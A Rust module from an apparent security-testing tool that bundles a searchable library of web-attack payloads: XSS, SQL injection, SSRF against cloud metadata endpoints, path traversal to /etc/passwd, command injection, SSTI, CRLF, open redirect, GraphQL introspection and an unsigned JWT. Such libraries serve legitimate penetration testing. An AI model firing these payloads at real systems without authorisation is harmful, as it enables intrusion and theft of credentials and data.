//! Searchable, taggable payload encyclopedia.
//!
//! Bundled with a curated default set; users can append their own.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadEntry {
    pub category: String,
    pub label: String,
    pub payload: String,
    pub tags: Vec<&'static str>,
    pub notes: Option<&'static str>,
}

pub fn bundled() -> Vec<PayloadEntry> {
    let mut out = Vec::new();
    macro_rules! e {
        ($cat:expr, $label:expr, $payload:expr, [$($tag:expr),*]) => {
            out.push(PayloadEntry {
                category: $cat.to_string(),
                label: $label.to_string(),
                payload: $payload.to_string(),
                tags: vec![$($tag),*],
                notes: None,
            });
        };
    }
    // XSS
    e!("xss", "Plain script alert", "<script>alert(1)</script>", ["xss", "html"]);
    e!("xss", "SVG onload", "<svg/onload=alert(1)>", ["xss", "html"]);
    e!("xss", "Image onerror", "<img src=x onerror=alert(1)>", ["xss", "html"]);
    e!("xss", "Quote breakout", "\"><script>alert(1)</script>", ["xss", "attribute"]);
    e!("xss", "JS pseudo-protocol", "javascript:alert(1)", ["xss", "link"]);
    e!("xss", "DOM via location.hash", "#<img src=x onerror=alert(1)>", ["xss", "dom"]);
    // SQLi
    e!("sqli", "Classic OR 1=1", "' OR '1'='1", ["sqli", "auth-bypass"]);
    e!("sqli", "Comment out the rest", "admin'--", ["sqli", "auth-bypass"]);
    e!("sqli", "UNION baseline", "' UNION SELECT NULL--", ["sqli", "union"]);
    e!("sqli", "MySQL time blind", "' OR SLEEP(5)-- -", ["sqli", "time-blind", "mysql"]);
    e!("sqli", "Postgres time blind", "' OR pg_sleep(5)-- -", ["sqli", "time-blind", "postgres"]);
    e!("sqli", "MSSQL waitfor", "' WAITFOR DELAY '0:0:5'-- -", ["sqli", "time-blind", "mssql"]);
    // SSRF
    e!("ssrf", "AWS metadata", "http://169.254.169.254/latest/meta-data/", ["ssrf", "aws"]);
    e!("ssrf", "GCP metadata", "http://metadata.google.internal/computeMetadata/v1/", ["ssrf", "gcp"]);
    e!("ssrf", "Azure metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["ssrf", "azure"]);
    e!("ssrf", "Loopback SSH", "http://127.0.0.1:22", ["ssrf", "loopback"]);
    e!("ssrf", "DNS rebinding hostname", "http://1.1.1.1.nip.io/", ["ssrf", "dns"]);
    // Traversal
    e!("traversal", "Unix passwd", "../../../etc/passwd", ["traversal", "unix"]);
    e!("traversal", "URL-encoded", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", ["traversal", "encoded"]);
    e!("traversal", "Win win.ini", "..\\..\\..\\windows\\win.ini", ["traversal", "windows"]);
    // Command injection
    e!("cmdi", "Semicolon id", "; id", ["cmdi", "unix"]);
    e!("cmdi", "Backtick id", "`id`", ["cmdi", "unix"]);
    e!("cmdi", "Powershell whoami", "& whoami", ["cmdi", "windows"]);
    // SSTI
    e!("ssti", "Jinja2 7*7", "{{7*7}}", ["ssti", "jinja2", "twig"]);
    e!("ssti", "Freemarker 7*7", "${7*7}", ["ssti", "freemarker"]);
    e!("ssti", "ERB 7*7", "<%= 7*7 %>", ["ssti", "erb", "ruby"]);
    e!("ssti", "Smarty 7*7", "{7*7}", ["ssti", "smarty"]);
    // CRLF
    e!("crlf", "Header injection", "lancer%0d%0aX-Injected:1", ["crlf"]);
    // Open redirect
    e!("openredirect", "Schemeless", "//evil.example.com/", ["openredirect"]);
    e!("openredirect", "Backslash trick", "/\\evil.example.com", ["openredirect"]);
    // GraphQL
    e!("graphql", "Introspection query", "{__schema{types{name fields{name}}}}", ["graphql", "introspection"]);
    // JWT
    e!("jwt", "alg=none header", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.", ["jwt"]);
    out
}

pub fn search<'a>(library: &'a [PayloadEntry], query: &str) -> Vec<&'a PayloadEntry> {
    let q = query.to_ascii_lowercase();
    let tokens: Vec<&str> = q.split_whitespace().collect();
    library
        .iter()
        .filter(|p| {
            let hay = format!(
                "{} {} {}",
                p.label.to_ascii_lowercase(),
                p.category.to_ascii_lowercase(),
                p.tags.join(" ").to_ascii_lowercase(),
            );
            tokens.iter().all(|t| hay.contains(t))
        })
        .collect()
}
